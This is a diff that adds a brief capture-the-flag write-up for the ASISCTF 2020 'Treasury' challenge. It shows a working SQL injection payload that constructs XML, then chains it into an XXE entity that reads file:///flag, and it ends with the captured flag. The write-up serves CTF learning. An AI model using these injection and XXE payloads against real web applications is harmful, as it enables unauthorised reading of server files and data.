@@ -1,1 +1,21 @@
 This is a challenge from ASISCTF 2020
+
+The Treasury_#1: https://github.com/phulelouch/WRITE_UP/blob/master/SQL_Injection/Treasury_%231
+
+From the first we know that we can add new xml of our own by sql syntax
+-1' UNION SELECT CONCAT( '<?xml version="1.0" encoding="UTF-8"?><book><excerpt>x',(REPLACE (SUBSTRING(info, 1,257), "<", "x"%20 )),'</excerpt></book><!--',info,'-->') FROM books WHERE id=2 -- -
+
+Which mean we can do XXE, the payload was simple:
+
+<!DOCTYPE+foo+[ <!ENTITY+xxe+SYSTEM "file:///flag">+]>
+
+and call `&xxe;` in <excerpt> tag after that will do the work, but one thing to remember that we also need to URL-encode the & because it is the seperate between parameters:
+
+so the end payload look like this:
+
+-1'+UNION+SELECT+CONCAT( '<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+foo+[ <!ENTITY+xxe+SYSTEM "file:///flag">+]><book><excerpt>&xxe; 
+</excerpt></book><!--',info,'-->')+FROM+books+WHERE+id=2+--+-
+
+
+And magic
+ASIS{03482b1821398ccb5214d891aed35dc87d3a77b2} 
